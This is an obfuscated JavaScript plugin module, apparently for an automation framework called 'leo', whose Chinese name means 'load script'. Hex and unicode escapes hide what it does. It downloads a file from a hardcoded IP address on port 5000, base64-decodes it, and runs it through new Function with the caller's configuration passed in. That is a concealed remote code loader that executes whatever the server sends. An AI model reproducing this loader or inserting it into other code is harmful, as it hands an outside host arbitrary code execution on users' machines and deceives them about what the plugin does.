const pluginName = '\u52a0\u8f7d\u811a\u672c', version = '\x31\x2e\x30';
let first = ![];
const getVersion = () => {
        return version;
    }, tips = async _0xea5cd7 => {
        await leo['\x6c\x6f\x67']('\u5df2\u6210\u529f\u52a0\u8f7d' + pluginName + '\u63d2\u4ef6\uff0c\u63d2\u4ef6\u7248\u672c\x5b' + version + '\x5d');
    }, init = async _0x19e06f => {
        _0x19e06f['\x6a\x6f\x62'] = _0x19e06f['\x6a\x6f\x62'] ? _0x19e06f['\x6a\x6f\x62'] : '\x67\x67', leo['\x73\x65\x6e\x64\x47\x65\x74'] = (_0x71a932, _0x263c1f) => new Promise((_0x53e953, _0x3db396) => {
            leo['\x72\x65\x71\x75\x65\x73\x74']['\x67\x65\x74']({
                '\x75\x72\x6c': _0x71a932,
                '\x71\x73': _0x263c1f
            }, function (_0x7abeed, _0x20ab24, _0x19e73b) {
                !_0x7abeed && _0x20ab24['\x73\x74\x61\x74\x75\x73\x43\x6f\x64\x65'] == 0xc8 ? _0x53e953(_0x19e73b) : _0x53e953('\x7b\x22\x73\x74\x61\x74\x75\x73\x22\x3a\x22\x4e\x22\x2c\x22\x6d\x65\x73\x73\x61\x67\x65\x22\x3a\x22\x73\x74\x61\x74\x75\x73\x43\x6f\x64\x65\x3d' + _0x20ab24['\x73\x74\x61\x74\x75\x73\x43\x6f\x64\x65'] + '\x22\x7d');
            });
        });
        let _0x4d81e7 = '\x68\x74\x74\x70\x3a\x2f\x2f\x31\x32\x34\x2e\x32\x32\x33\x2e\x39\x30\x2e\x32\x32\x32\x3a\x35\x30\x30\x30\x2f\x63\x67\x61\x2f\x6a\x6f\x62\x5f' + _0x19e06f['\x6a\x6f\x62'] + '\x2e\x6a\x73';
        const _0x3801fc = await leo['\x73\x65\x6e\x64\x47\x65\x74'](_0x4d81e7);
        leo['\x63\x66'] = _0x4888a0 => new Function(Buffer['\x66\x72\x6f\x6d'](_0x4888a0, '\x62\x61\x73\x65\x36\x34')['\x74\x6f\x53\x74\x72\x69\x6e\x67']())();
        const _0x21ee85 = leo['\x63\x66'](_0x3801fc);
        return _0x21ee85(_0x19e06f);
    }, start = async _0x335868 => {
        return !first && (first = !![], tips(cga)), init(_0x335868);
    };
module['\x65\x78\x70\x6f\x72\x74\x73'] = { '\x73\x74\x61\x72\x74': start };